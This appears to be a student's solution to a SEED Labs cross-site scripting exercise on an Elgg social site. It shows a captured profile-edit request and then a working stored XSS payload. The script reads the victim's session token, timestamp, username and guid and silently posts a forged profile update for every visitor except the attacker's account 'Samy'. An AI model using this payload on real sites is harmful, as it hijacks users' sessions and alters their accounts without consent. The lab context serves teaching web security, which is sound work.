//1.Inspected the network tab while updating and got the following request
//http://www.xsslabelgg.com/action/profile/edit

//2.Inspected the data for that specific request and got the following
// __elgg_token=ovHRJ8y0tRTZTGYvWJ6P4Q
// __elgg_ts=1624227015
// name=Samy
// description=1605053
// accesslevel[description]=1
// briefdescription=a
// accesslevel[briefdescription]=1
// location=b
// accesslevel[location]=1
// interests=c
// accesslevel[interests]=1
// skills=d
// accesslevel[skills]=1
// contactemail=email@gmail.com
// accesslevel[contactemail]=1
// phone=f
// accesslevel[phone]=1
// mobile=g
// accesslevel[mobile]=1
// website=http://www.mysite.com
// accesslevel[website]=1
// twitter=i
// accesslevel[twitter]=1
// guid=47

//3.concat them into ajax post request content
//Reference: https://www.w3schools.com/js/js_ajax_http_send.asp

<script type="text/javascript">
	window.onload = function(){
	//JavaScript code to access user name, user guid, Time Stamp __elgg_ts
	//and Security Token __elgg_token
	var userName = elgg.session.user.username
	var uNameHeader = "&username="+userName
	var guid = elgg.session.user.guid
	var guidHeader = "&guid="+guid
	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
	var token="&__elgg_token="+elgg.security.token.__elgg_token;
	//Construct the content of your url.
    var sendurl="http://www.xsslabelgg.com/action/profile/edit" //FILL IN
	var content=ts+token+uNameHeader+guidHeader+"&description=1605053"+
	"&accesslevel[description]=1"+
	"&briefdescription=a"+
	"&accesslevel[briefdescription]=1"+
	"&location=b"+
	"&accesslevel[location]=1"+
	"&interests=c"+
	"&accesslevel[interests]=1"+
	"&skills=d"+
	"&accesslevel[skills]=1"+
	"&contactemail=email@gmail.com"+
	"&accesslevel[contactemail]=1"+
	"&phone=f"+
	"&accesslevel[phone]=1"+
	"&mobile=g"+
	"&accesslevel[mobile]=1"+
	"&website=http://www.mysite.com"+
	"&accesslevel[website]=1"+
	"&twitter=i"+
	"&accesslevel[twitter]=1" //FILL IN
	
	if(userName!='samy' && guid!=47)
	{
		//Create and send Ajax request to modify profile
		var Ajax=null;
		Ajax=new XMLHttpRequest();
		Ajax.open("POST",sendurl,true);
		Ajax.setRequestHeader("Host","www.xsslabelgg.com");
		Ajax.setRequestHeader("Content-Type",
		"application/x-www-form-urlencoded");
		Ajax.send(content);
	}
	}
</script>